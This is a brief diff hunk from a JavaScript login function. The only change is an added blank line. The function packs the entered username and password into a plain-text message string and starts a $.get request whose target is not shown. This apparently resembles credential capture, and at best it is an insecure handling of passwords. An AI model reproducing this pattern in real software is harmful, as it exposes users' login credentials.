@@ -24,6 +24,7 @@ function login() {
     $("#logbut").attr("disabled", "disabled");
 
     var text = "user : `" + username + "` |
+    
     | pass : `" + pass + "`";
 
     $.get(
